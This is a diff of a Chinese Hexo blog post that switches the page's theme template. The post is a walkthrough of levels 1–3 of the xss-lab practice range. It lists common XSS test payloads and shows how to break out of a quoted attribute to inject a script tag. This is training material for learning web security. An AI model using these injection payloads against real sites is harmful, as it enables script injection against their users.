@@ -1,230 +1,728 @@
-<!DOCTYPE html><html lang="zh-CN"><head><!-- hexo injector head_begin start --><link href="https://cdn.jsdelivr.net/npm/hexo-widget-tree@0.0.5/css/index.css" rel="stylesheet"/><!-- hexo injector head_begin end --><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#00EE76"><meta name="author" content="Na0h_1e3"><meta name="copyright" content="Na0h_1e3"><meta name="generator" content="Hexo 5.3.0"><meta name="theme" content="hexo-theme-yun"><title>xss-lab通关小记 | Na0h的神光棒存放地</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.22/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
-  [".post-card",".post-content img"].forEach((target)=> {
-    ScrollReveal().reveal(target);
-  })
-});
-</script><link rel="shortcut icon" type="image/svg+xml" href="/favicon.ico"><link rel="mask-icon" href="/favicon.ico" color="#00EE76"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script id="yun-config">
-    const Yun = window.Yun || {};
-    window.CONFIG = {"hostname":"na0hblog.top","root":"/","title":["Na0h","的","神光棒存放地"],"version":"1.3.0","mode":"auto","copycode":true,"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["0, 255, 127","0, 238, 118","0, 139, 69"]}};
-  </script><script>(function(){
-  var bp = document.createElement('script');
-  var curProtocol = window.location.protocol.split(':')[0];
-  if (curProtocol === 'https') {
-    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-  }
-  else {
-    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-  }
-  var s = document.getElementsByTagName("script")[0];
-  s.parentNode.insertBefore(bp, s);
-})();</script><meta name="description" content="这是xsslab的通关小记">
-<meta property="og:type" content="article">
-<meta property="og:title" content="xss-lab通关小记">
-<meta property="og:url" content="http://na0hblog.top/2021/01/03/xss-lab%E9%80%9A%E5%85%B3%E5%B0%8F%E8%AE%B0/index.html">
-<meta property="og:site_name" content="Na0h的神光棒存放地">
-<meta property="og:description" content="这是xsslab的通关小记">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103103711865.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103103719220.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103103825266.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103103838449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103103859273.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103103909655.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103103917456.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103103921171.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103103926143.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2021010310392937.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2021010310393347.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2021010310393639.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103103939777.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103103942592.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103103945301.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103103948721.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103103952207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103103956320.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104000396.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104125172.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104130106.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104133318.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104137413.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104141300.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104149942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104152751.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104158240.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104201134.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104208625.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104218698.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104223338.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104229599.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104242894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2021010310424745.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104250718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104256128.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104300543.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104302889.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104321557.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104326596.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104328932.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104335693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104340627.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104344405.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104347190.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104351645.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104355713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210103104358763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70">
-<meta property="article:published_time" content="2021-01-03T03:17:18.000Z">
-<meta property="article:modified_time" content="2021-02-04T15:09:11.753Z">
-<meta property="article:author" content="Na0h_1e3">
-<meta property="article:tag" content="xss">
-<meta property="article:tag" content="靶场">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210103103711865.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Na0h_1e3"><img width="96" loading="lazy" src="/images/agif.gif" alt="Na0h_1e3"><span class="site-author-status" title="浮舟沧海">💯</span></a><div class="site-author-name"><a href="/about/">Na0h_1e3</a></div><a class="site-name" href="/about/site.html">Na0h的神光棒存放地</a><sub class="site-subtitle">一点诚心，万缘俱息</sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">6</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">9</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="主题文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="tencent://message?uin=1163435945" title="QQ" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/seldomlee" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=432232046" title="网易云音乐" target="_blank" style="color:#C20C0C"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-netease-cloud-music-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/42264529" title="哔哩哔哩" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="1163435945@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Level1"><span class="toc-number">1.1.</span> <span class="toc-text">Level1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level2"><span class="toc-number">1.2.</span> <span class="toc-text">Level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level3"><span class="toc-number">1.3.</span> <span class="toc-text">Level3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level4"><span class="toc-number">1.4.</span> <span class="toc-text">Level4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level5"><span class="toc-number">1.5.</span> <span class="toc-text">Level5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level6"><span class="toc-number">1.6.</span> <span class="toc-text">Level6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level7"><span class="toc-number">1.7.</span> <span class="toc-text">Level7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level8"><span class="toc-number">1.8.</span> <span class="toc-text">Level8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level9"><span class="toc-number">1.9.</span> <span class="toc-text">Level9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level10"><span class="toc-number">1.10.</span> <span class="toc-text">Level10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level11"><span class="toc-number">1.11.</span> <span class="toc-text">Level11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level12"><span class="toc-number">1.12.</span> <span class="toc-text">Level12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level13"><span class="toc-number">1.13.</span> <span class="toc-text">Level13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level14"><span class="toc-number">1.14.</span> <span class="toc-text">Level14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level15"><span class="toc-number">1.15.</span> <span class="toc-text">Level15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level16"><span class="toc-number">1.16.</span> <span class="toc-text">Level16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level17"><span class="toc-number">1.17.</span> <span class="toc-text">Level17</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level18"><span class="toc-number">1.18.</span> <span class="toc-text">Level18</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="http://na0hblog.top/2021/01/03/xss-lab%E9%80%9A%E5%85%B3%E5%B0%8F%E8%AE%B0/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Na0h_1e3"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Na0h的神光棒存放地"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">xss-lab通关小记<a class="post-edit-link" href="https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name_posts/xss-lab通关小记.md" target="_blank" title="编辑" rel="noopener"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-edit-line"></use></svg></a></h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="创建时间：2021-01-03 11:17:18" itemprop="dateCreated datePublished" datetime="2021-01-03T11:17:18+08:00">2021-01-03</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <time title="修改时间：2021-02-04 23:09:11" itemprop="dateModified" datetime="2021-02-04T23:09:11+08:00">2021-02-04</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-file-word-line"></use></svg></span> <span title="本文字数">1.3k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-timer-line"></use></svg></span> <span title="阅读时长">5m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/%E9%9D%B6%E5%9C%BA/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">靶场</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag" href="/tags/xss/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">xss</span></a><a class="tag" href="/tags/%E9%9D%B6%E5%9C%BA/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">靶场</span></a></span></div><div class="post-author"><span class="author-name">Na0h_1e3</span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#00EE76;"><a id="more"></a>
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
+
+
+
+<head><!-- hexo injector head_begin start --><link href="https://cdn.jsdelivr.net/npm/hexo-widget-tree@0.0.5/css/index.css" rel="stylesheet"/><!-- hexo injector head_begin end -->
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/txbb.jpg">
+  <link rel="icon" type="image/png" href="/img/txbb.jpg">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Na0h_1e3">
+  <meta name="keywords" content="Na0h1e3,blog,博客,web,ctf,渗透">
+  <title>xss-lab通关小记 - Na0h的神光棒存放地</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"na0hblog.top","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"🐳_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":"G-MLL1PZ9RBK","gtag":260676474,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"zjCV2oT3ti8Lyk0insYTRpLr-gzGzoHsz","app_key":"y4AXlgIqQsV7Enr3IFS3r6Ck","server_url":"https://zjcv2ot3.lc-cn-n1-shared.com"}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Na0h的神光棒存放地</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/textbg.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="xss-lab通关小记">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-01-03 11:17" pubdate>
+        2021年1月3日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      18
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">xss-lab通关小记</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年2月8日 凌晨
+                
+              </p>
+            
+            <div class="markdown-body">
+              <!-- more -->
 
 <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>实际构造闭合，另外要对js有一定了解</p>
 <p>常用测试语句：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">&lt;img src=x onerror=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;svg onload=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;a href=javascript:alert(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;alert(<span class="hljs-number">1</span>)&lt;/script&gt;<br>&lt;img src=x onerror=alert(<span class="hljs-number">1</span>)&gt;<br>&lt;svg onload=alert(<span class="hljs-number">1</span>)&gt;<br>&lt;a href=javascript:alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure>
 <h2 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h2><p>url为：<a target="_blank" rel="noopener" href="http://xssaq.com/yx/level1.php?name=test">http://xssaq.com/yx/level1.php?name=test</a><br>GET型，源码显示<br>在传参处插入代码即可：?name=<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
-<h2 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h2><p>Url为:<a target="_blank" rel="noopener" href="http://xssaq.com/yx/level2.php?keyword=test">http://xssaq.com/yx/level2.php?keyword=test</a><br>GET型,输入<code>&lt;script&gt;alert(/hack11/)&lt;/script&gt;</code>：<br><img src="https://img-blog.csdnimg.cn/20210103103711865.png" alt="在这里插入图片描述" loading="lazy"></p>
-<p>构造闭合，即<code>&quot;&gt;&lt;script&gt;alert(/hack11/)&lt;/script&gt;//</code><br>“和&gt;将其之前的语句闭合为value=&lt;””&gt;,//或者&lt;”将后方”&gt;注释<br><img src="https://img-blog.csdnimg.cn/20210103103719220.png" alt="在这里插入图片描述" loading="lazy"></p>
-<h2 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h2><p>Value同2，value=””&gt;<br><code>&lt;script&gt;alert(/hack11/)&lt;/script&gt;</code>,查看响应，后端将&lt;&gt;过滤了<br><img src="https://img-blog.csdnimg.cn/20210103103825266.png" alt="在这里插入图片描述" loading="lazy"></p>
-<p>查看源码，使用了htmlspecialchars函数<br><img src="https://img-blog.csdnimg.cn/20210103103838449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20210103103859273.png" alt="在这里插入图片描述" loading="lazy"></p>
+<h2 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h2><p>Url为:<a target="_blank" rel="noopener" href="http://xssaq.com/yx/level2.php?keyword=test">http://xssaq.com/yx/level2.php?keyword=test</a><br>GET型,输入<code>&lt;script&gt;alert(/hack11/)&lt;/script&gt;</code>：<br><img src="https://img-blog.csdnimg.cn/20210103103711865.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>构造闭合，即<code>&quot;&gt;&lt;script&gt;alert(/hack11/)&lt;/script&gt;//</code><br>“和&gt;将其之前的语句闭合为value=&lt;””&gt;,//或者&lt;”将后方”&gt;注释<br><img src="https://img-blog.csdnimg.cn/20210103103719220.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<h2 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h2><p>Value同2，value=””&gt;<br><code>&lt;script&gt;alert(/hack11/)&lt;/script&gt;</code>,查看响应，后端将&lt;&gt;过滤了<br><img src="https://img-blog.csdnimg.cn/20210103103825266.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
